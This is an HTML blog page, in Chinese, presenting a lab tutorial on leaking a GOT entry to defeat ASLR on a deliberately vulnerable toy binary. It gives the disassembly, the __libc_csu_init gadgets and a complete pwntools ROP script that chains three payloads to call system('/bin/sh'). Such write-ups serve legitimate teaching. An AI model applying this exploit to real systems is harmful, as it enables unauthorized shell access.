@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.void0red.top","root":"/","scheme":"Pisces","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="this is a test, not true  0x00准备 本次实验的机器为Ubuntu 16.04.2 LTS64位系统  用gcc编译需要关闭stack-protector  需要gdb peda pwntools">
+<meta property="og:type" content="article">
+<meta property="og:title" content="leak_got_addr">
+<meta property="og:url" content="https://blog.void0red.top/2017/11/15/leak_gotaddr/index.html">
+<meta property="og:site_name" content="void0red&#39;s blog">
+<meta property="og:description" content="this is a test, not true  0x00准备 本次实验的机器为Ubuntu 16.04.2 LTS64位系统  用gcc编译需要关闭stack-protector  需要gdb peda pwntools">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.void0red.top/images/leak_gotaddr_0.png">
+<meta property="og:image" content="https://blog.void0red.top/images/leak_gotaddr_1.png">
+<meta property="article:published_time" content="2017-11-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-02-11T02:30:51.559Z">
+<meta property="article:author" content="void0red">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.void0red.top/images/leak_gotaddr_0.png">
+
+<link rel="canonical" href="https://blog.void0red.top/2017/11/15/leak_gotaddr/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>leak_got_addr | void0red's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">void0red's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.void0red.top/2017/11/15/leak_gotaddr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="void0red">
+      <meta itemprop="description" content="stupid">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="void0red's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          leak_got_addr
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-15 00:00:00" itemprop="dateCreated datePublished" datetime="2017-11-15T00:00:00+08:00">2017-11-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-02-11 10:30:51" itemprop="dateModified" datetime="2020-02-11T10:30:51+08:00">2020-02-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>this is a test, not true</p>
+</blockquote>
+<h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><ul>
+<li><p>本次实验的机器为<code>Ubuntu 16.04.2 LTS</code>64位系统</p>
+</li>
+<li><p>用<code>gcc</code>编译需要关闭<code>stack-protector</code></p>
+</li>
+<li><p>需要<code>gdb</code> <code>peda</code> <code>pwntools</code></p>
+<a id="more"></a></li>
+<li><p>攻击目标<code>test.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"2333\n"</span>,<span class="number">5</span>);</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x01分析"><a href="#0x01分析" class="headerlink" title="0x01分析"></a>0x01分析</h2><p>这次把栈溢出的保护几乎都打开了，<code>ASLR</code>使得无法通过<code>ret2libc</code>来获得shell，栈上也没有可执行权限。所以可以通过<code>write</code>函数leak一个函数在内存中的地址（它是随机的），然后根据<code>libc.so.6</code>文件中<code>system</code>与<code>write</code>的相对地址，推算出<code>system</code>在本次运行中的内存中的地址。</p>
+<p>这里可以利用一个Linux下的特性，<strong>lazy binding</strong>，简单来说，GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
+<p>第一次函数调用：<br><img src="/images/leak_gotaddr_0.png" alt="第一次调用函数"><br>以后的函数调用：<br><img src="/images/leak_gotaddr_1.png" alt="以后的函数调用"></p>
+<p>例如：下面的执行流处于调用<code>write</code>函数的上面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   0x40056e &lt;main+8&gt;:	mov    edx,0x5</span><br><span class="line">   0x400573 &lt;main+13&gt;:	mov    esi,0x400624</span><br><span class="line">   0x400578 &lt;main+18&gt;:	mov    edi,0x1</span><br><span class="line">&#x3D;&gt; 0x40057d &lt;main+23&gt;:	call   0x400430 &lt;write@plt&gt;</span><br><span class="line">   0x400582 &lt;main+28&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x400586 &lt;main+32&gt;:	mov    edx,0x100</span><br><span class="line">   0x40058b &lt;main+37&gt;:	mov    rsi,rax</span><br><span class="line">   0x40058e &lt;main+40&gt;:	mov    edi,0x0</span><br></pre></td></tr></table></figure>
+
+<p>跟进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  0x400420:	push   QWORD PTR [rip+0x200be2]        # 0x601008</span><br><span class="line">   0x400426:	jmp    QWORD PTR [rip+0x200be4]        # 0x601010</span><br><span class="line">   0x40042c:	nop    DWORD PTR [rax+0x0]</span><br><span class="line">&#x3D;&gt; 0x400430 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x200be2]        # 0x601018</span><br><span class="line"> | 0x400436 &lt;write@plt+6&gt;:	push   0x0</span><br><span class="line"> | 0x40043b &lt;write@plt+11&gt;:	jmp    0x400420</span><br><span class="line"> | 0x400440 &lt;read@plt&gt;:	jmp    QWORD PTR [rip+0x200bda]        # 0x601020</span><br><span class="line"> | 0x400446 &lt;read@plt+6&gt;:	push   0x1</span><br><span class="line"> |-&gt;   0x400436 &lt;write@plt+6&gt;:	push   0x0</span><br><span class="line">       0x40043b &lt;write@plt+11&gt;:	jmp    0x400420</span><br><span class="line">       0x400440 &lt;read@plt&gt;:	jmp    QWORD PTR [rip+0x200bda]        # 0x601020</span><br><span class="line">       0x400446 &lt;read@plt+6&gt;:	push   0x1</span><br><span class="line">                                                                  JUMP is taken</span><br></pre></td></tr></table></figure>
+
+<p>指令准备发生跳转到<code>0x400420</code>处，而<code>0x400420</code>处的指令即是跳转到<code>0x601010</code>，<code>0x601010</code>处存储的是解析函数实际地址的指令地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  0x40041c:	add    BYTE PTR [rax],al</span><br><span class="line">   0x40041e:	add    BYTE PTR [rax],al</span><br><span class="line">   0x400420:	push   QWORD PTR [rip+0x200be2]        # 0x601008</span><br><span class="line">&#x3D;&gt; 0x400426:	jmp    QWORD PTR [rip+0x200be4]        # 0x601010</span><br><span class="line"> | 0x40042c:	nop    DWORD PTR [rax+0x0]</span><br><span class="line"> | 0x400430 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x200be2]        # 0x601018</span><br><span class="line"> | 0x400436 &lt;write@plt+6&gt;:	push   0x0</span><br><span class="line"> | 0x40043b &lt;write@plt+11&gt;:	jmp    0x400420</span><br><span class="line"> |-&gt;   0x7ffff7dee870 &lt;_dl_runtime_resolve_avx&gt;:	push   rbx</span><br><span class="line">       0x7ffff7dee871 &lt;_dl_runtime_resolve_avx+1&gt;:	mov    rbx,rsp</span><br><span class="line">       0x7ffff7dee874 &lt;_dl_runtime_resolve_avx+4&gt;:	and    rsp,0xffffffffffffffe0</span><br><span class="line">       0x7ffff7dee878 &lt;_dl_runtime_resolve_avx+8&gt;:	sub    rsp,0x180</span><br><span class="line">                                                                  JUMP is taken</span><br></pre></td></tr></table></figure>
+
+<p>上面的<code>_dl_runtime_resolve_avx</code>函数就是解析实际地址的指令</p>
+<h2 id="0x02查找可用的gadgets"><a href="#0x02查找可用的gadgets" class="headerlink" title="0x02查找可用的gadgets"></a>0x02查找可用的gadgets</h2><p>因为<code>write</code>函数至少需要三个参数，所以需要找到<code>rdi，rsi，rdx</code>来传递参数，这个时候，<code>&lt;__libc_csu_init&gt;</code>函数就比较好用了，用<code>objdump -S test</code>来查看所有的汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005a0:	41 57                	push   %r15</span><br><span class="line">  4005a2:	41 56                	push   %r14</span><br><span class="line">  4005a4:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line">  4005a7:	41 55                	push   %r13</span><br><span class="line">  4005a9:	41 54                	push   %r12</span><br><span class="line">  4005ab:	4c 8d 25 5e 08 20 00 	lea    0x20085e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4005b2:	55                   	push   %rbp</span><br><span class="line">  4005b3:	48 8d 2d 5e 08 20 00 	lea    0x20085e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  4005ba:	53                   	push   %rbx</span><br><span class="line">  4005bb:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005be:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line">  4005c1:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005c4:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4005c8:	48 c1 fd 03          	sar    $0x3,%rbp</span><br><span class="line">  4005cc:	e8 2f fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005d1:	48 85 ed             	test   %rbp,%rbp</span><br><span class="line">  4005d4:	74 20                	je     4005f6 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005d6:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005df:	00</span><br><span class="line">  4005e0:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line">  4005e3:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  4005e6:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line">  4005e9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  4005ed:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  4005f1:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  4005f4:	75 ea                	jne    4005e0 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  4005f6:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  4005fa:	5b                   	pop    %rbx</span><br><span class="line">  4005fb:	5d                   	pop    %rbp</span><br><span class="line">  4005fc:	41 5c                	pop    %r12</span><br><span class="line">  4005fe:	41 5d                	pop    %r13</span><br><span class="line">  400600:	41 5e                	pop    %r14</span><br><span class="line">  400602:	41 5f                	pop    %r15</span><br><span class="line">  400604:	c3                   	retq   </span><br><span class="line">  400605:	90                   	nop</span><br><span class="line">  400606:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40060d:	00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>可以看到从<code>0x4005fa</code>开始，进行了弹栈，可以控制<code>rbx，rbp，r12，r13，r14，r15</code>的值，配合<code>0x4005e0</code>处的指令，就可以控制<code>edi，rsi，rdx</code>的值了，要注意的是<code>0x4005f4</code>处有一个跳转指令，要让跳转失效，就必须让<code>rbp==rbx</code>，继续向前看，<code>0x4005ed</code>处让<code>rbx</code>加上了1，<code>0x4005e9</code>处的意思是调用<code>r12+rbx×8</code>处的指令，不妨让<code>rbx=0</code>，<code>rbp=1</code></p>
+<h2 id="0x03编写payload"><a href="#0x03编写payload" class="headerlink" title="0x03编写payload"></a>0x03编写payload</h2><p>尝试了一下新工具<code>pwntools</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./test'</span>)</span><br><span class="line">return_offset = <span class="number">24</span></span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">gadget0_addr = <span class="number">0x4005fa</span></span><br><span class="line">gadget1_addr = <span class="number">0x4005e0</span></span><br><span class="line">main_addr = <span class="number">0x400566</span></span><br><span class="line">bss_addr = <span class="number">0x601040</span></span><br><span class="line">symbols_offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * return_offset</span><br><span class="line">payload1 += p64(gadget0_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) + p64(got_write) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(gadget1_addr)</span><br><span class="line">payload1 += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./test'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'2333\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------payload1'</span></span><br><span class="line"></span><br><span class="line">r.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line">system_addr = write_addr - symbols_offset</span><br><span class="line">r.recvuntil(<span class="string">'2333\n'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * return_offset</span><br><span class="line">payload2 += p64(gadget0_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(gadget1_addr)</span><br><span class="line">payload2 += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------payload2'</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(p64(system_addr))</span><br><span class="line">r.send(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'2333\n'</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span> * return_offset</span><br><span class="line">payload3 += p64(gadget0_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">payload3 += p64(gadget1_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------payload3'</span></span><br><span class="line">r.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>三段payload的结构大致相似，首先一段padding，填充到<code>read</code>函数的返回地址之前，然后让程序跳转到<code>pop...</code>处，接下来，是需要<code>pop</code>对象：</p>
+<p>第一个0是存进<code>rbx</code>的，第二个1是存进<code>rbp</code>的，接下来是<code>write</code>函数在GOT表中的地址，存进<code>r12</code>，也就是第二个<code>gadget</code>中<code>call</code>的对象，然后是<code>write</code>函数的三个参数（注意寄存器顺序），其中第二个参数是<code>write</code>函数在GOT表中的地址，因为已经执行过<code>write</code>函数了（现在执行流就在<code>write</code>函数里面），所以这个地址存放的指令不再是跳转，解析，而是<code>write</code>函数在内存中的实际地址，这样就让程序<code>leak</code>出了一段真实地址</p>
+<p>现在payload已经完成了所有值的传递，接着是第二段<code>gadget</code>，然后为了让程序回到<code>main</code>函数里面（保住接着溢出攻击），用54字节的padding填充弹栈行为，劫持到<code>0x400604</code>处的<code>retq</code>指令，回到<code>main</code>函数</p>
+<p>然后两个<code>payload</code>和第一个结构类似，第二个<code>payload</code>将<code>system</code>的实际地址，以及<code>/bin/sh</code>存入<code>.bss</code>段中，第三个<code>payload</code>则是调用<code>system</code>函数，实现getshell</p>
+<h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>通过<code>leak_gotaddr</code>，可以获得函数的真实地址，也就是绕过了<code>ASLR</code>的保护</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/11/10/ret2libc/" rel="prev" title="ret2libc">
+      <i class="fa fa-chevron-left"></i> ret2libc
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/12/15/linux%E6%9D%83%E9%99%90/" rel="next" title="linux权限(rws与rwt)">
+      linux权限(rws与rwt) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00准备"><span class="nav-number">1.</span> <span class="nav-text">0x00准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01分析"><span class="nav-number">2.</span> <span class="nav-text">0x01分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02查找可用的gadgets"><span class="nav-number">3.</span> <span class="nav-text">0x02查找可用的gadgets</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03编写payload"><span class="nav-number">4.</span> <span class="nav-text">0x03编写payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04总结"><span class="nav-number">5.</span> <span class="nav-text">0x04总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="void0red"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">void0red</p>
+  <div class="site-description" itemprop="description">stupid</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/void0red" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;void0red" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:void0red@gmail.com" title="E-Mail → mailto:void0red@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">void0red</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
